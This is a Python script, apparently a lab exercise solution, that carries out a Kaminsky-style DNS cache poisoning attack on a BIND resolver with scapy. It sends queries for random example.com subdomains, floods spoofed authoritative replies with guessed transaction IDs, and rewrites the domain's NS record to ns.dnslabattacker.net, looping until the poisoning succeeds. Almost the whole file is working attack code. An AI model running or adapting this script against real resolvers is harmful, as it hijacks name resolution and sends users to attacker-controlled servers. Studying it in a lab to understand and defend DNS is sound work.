#!/usr/bin/env python2
import argparse
import socket

from scapy.all import *
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call


parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=False)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port
# BIND's port
dns_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 256)

'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
    sendPacket(sock, dnsPacket, my_ip, my_port)
    response = sock.recv(4096)
    response = DNS(response)
    print "\n***** Packet Received from Remote Server *****"
    print response.show()
    print "***** End of Remote Server Packet *****\n"

# ***** Packet Received from Remote Server *****
# ###[ DNS ]### 
#   id        = 0
#   qr        = 1L
#   opcode    = QUERY
#   aa        = 0L
#   tc        = 0L
#   rd        = 1L
#   ra        = 1L
#   z         = 0L
#   ad        = 0L
#   cd        = 0L
#   rcode     = ok
#   qdcount   = 1
#   ancount   = 1
#   nscount   = 2
#   arcount   = 2
#   \qd        \
#    |###[ DNS Question Record ]### 
#    |  qname     = 'example.com.'
#    |  qtype     = A
#    |  qclass    = IN
#   \an        \
#    |###[ DNS Resource Record ]### 
#    |  rrname    = 'example.com.'
#    |  type      = A
#    |  rclass    = IN
#    |  ttl       = 76528
#    |  rdlen     = 4
#    |  rdata     = '93.184.216.34'
#   \ns        \
#    |###[ DNS Resource Record ]### 
#    |  rrname    = 'example.com.'
#    |  type      = NS
#    |  rclass    = IN
#    |  ttl       = 76528
#    |  rdlen     = 20
#    |  rdata     = 'a.iana-servers.net.'
#    |###[ DNS Resource Record ]### 
#    |  rrname    = 'example.com.'
#    |  type      = NS
#    |  rclass    = IN
#    |  ttl       = 76528
#    |  rdlen     = 20
#    |  rdata     = 'b.iana-servers.net.'
#   \ar        \
#    |###[ DNS Resource Record ]### 
#    |  rrname    = 'a.iana-servers.net.'
#    |  type      = AAAA
#    |  rclass    = IN
#    |  ttl       = 162928
#    |  rdlen     = 16
#    |  rdata     = '2001:500:8f::53'
#    |###[ DNS Resource Record ]### 
#    |  rrname    = 'b.iana-servers.net.'
#    |  type      = AAAA
#    |  rclass    = IN
#    |  ttl       = 162928
#    |  rdlen     = 16
#    |  rdata     = '2001:500:8d::53'

# None
# ***** End of Remote Server Packet *****
def poisonBINDServer():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
    sendPacket(sock, dnsPacket, my_ip, my_port)
    response = sock.recv(4096)
    response = DNS(response)

    # manipulate the response
    response[DNS].aa = 1  # the responding name server is an authority for the domain name in question section
    response[DNS].ns.rrname = "example.com"
    response[DNS].ns.rdata = "ns.dnslabattacker.net"
    for i in range(1, response[DNS].nscount):
        del response[DNS].ns[i]
    response[DNS].nscount = 1
    # response[DNS].ar = None
    # response[DNS].arcount = 0

    while True:
        # query the BIND server for a non-existing name in example.com
        # since the mapping is not available in the BIND server' s cache
        # it will send out a DNS query to the name server of the example.com domain
        pick_random_domain = getRandomSubDomain() + ".example.com"

        dnsPacket[DNS].qd.qname = pick_random_domain
        sendPacket(sock, dnsPacket, my_ip, my_port)

        # while the BIND server waits for the reply from example.com's name server
        # flood it with a stream of spoofed DNS replies
        # each with a different transaction ID
        spoofing_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        response[DNS].qd.qname = pick_random_domain
        response[DNS].an.rrname = pick_random_domain
        for i in range(128):
            response[DNS].id = getRandomTXID()
            sendPacket(spoofing_sock, response, my_ip, my_query_port)
        spoofing_sock.close()

        BIND_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sendPacket(BIND_sock, DNS(rd=1, qd=DNSQR(qname='example.com')), my_ip, my_port)
        if DNS(BIND_sock.recv(4096))[DNS].ns[DNSRR].rdata == "ns.dnslabattacker.net.":
            print("DNS cache poisoning attack succeeded")
            BIND_sock.close()
            break
        BIND_sock.close()
        print("DNS cache poisoning attack failed, try again...")
    sock.close()
    

if __name__ == '__main__':
    # exampleSendDNSQuery()
    poisonBINDServer()
